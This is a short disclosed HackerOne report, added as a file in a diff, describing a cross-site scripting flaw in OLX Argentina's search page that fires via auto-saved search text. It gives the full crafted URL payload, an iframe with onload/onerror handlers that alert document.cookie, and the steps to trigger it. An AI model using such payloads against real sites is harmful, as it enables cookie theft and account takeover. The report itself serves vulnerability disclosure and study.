@@ -1,0 +1,23 @@
+ReportLink:https://hackerone.com/reports/151691
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/c37hun
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:15.10.2016 6:37:23
+
+Summary:
+
+Hi guys,
+I found XSS vulnerability on Home page olx.com.ar via auto save search text
+
+1. Copy full link and go to the URL in browser:
+>https://www.olx.com.ar/nf/search/xss%22-'%20%22%3E%3Ciframe/src%20////onload%20=%20alert(document.cookie)%20onerror=alert(document.cookie)
+
+2. Click logo button go back to home page look play load xss
+
+Sincerely,
+Jeyhun Jafarov (c37hun)
+Cybersecurity Specialist
+c37hun@mail.ru
